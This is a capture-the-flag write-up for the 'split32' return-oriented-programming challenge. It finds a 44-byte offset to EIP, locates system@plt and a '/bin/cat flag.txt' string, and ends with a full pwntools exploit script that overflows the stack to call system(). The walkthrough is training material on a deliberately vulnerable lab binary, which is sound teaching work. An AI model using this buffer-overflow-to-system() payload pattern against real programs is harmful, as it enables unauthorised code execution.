Similar to the ret2win challenge, this challenge requires an input from the user. We'll start with figuring out how many bytes we need to write to overwrite EIP:

```
# gdb -q ./split32
Reading symbols from ./split32...(no debugging symbols found)...done.
gdb-peda$ pattern_create 100 input
Writing pattern of 100 chars to filename "input"
gdb-peda$ run < input

gdb-peda$ pattern_search
...
EIP+0 found at offset: 44
...
```
Again, EIP is overwrittern starting with byte 44.
Lets find the system entry in the PLT section:
```
# objdump -d ./split32 -j .plt

./split32:     file format elf32-i386


Disassembly of section .plt:
.
.
.
08048430 <system@plt>:
 8048430:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048436:	68 18 00 00 00       	push   $0x18
 804843b:	e9 b0 ff ff ff       	jmp    80483f0 <.plt>
.
.
.
```

We can also do that using pwntools:
```python
system_addr = e.plt['system']
```

Now, let's find the address of '/bin/cat flag.txt':
```
gdb-peda$ searchmem '/bin/cat flag.txt'
Searching for '/bin/cat flag.txt' in: None ranges
Found 1 results, display max 1 items:
split32 : 0x804a030 ("/bin/cat flag.txt")
```

We can also use strings. In that case, we need to add the image base address:
```
# strings --radix=x ./split32 | grep cat
   1030 /bin/cat flag.txt
```

Or, we can do that using pwntools:
```
cmd_addr = next(e.search('/bin/cat flag.txt'))
```

Final exploit script:
```python
from pwn import *

context.update(arch='i386', os='linux')

e = ELF('./split32')
system_addr = e.plt['system']
cmd_addr = next(e.search('/bin/cat flag.txt'))

p = process('./split32')
p.recvuntil('>')

payload = 'A'*44
payload += p32(system_addr)
payload += 'A'*4 # Garbage return address
payload += p32(cmd_addr)

p.sendline(payload)

p.interactive()
```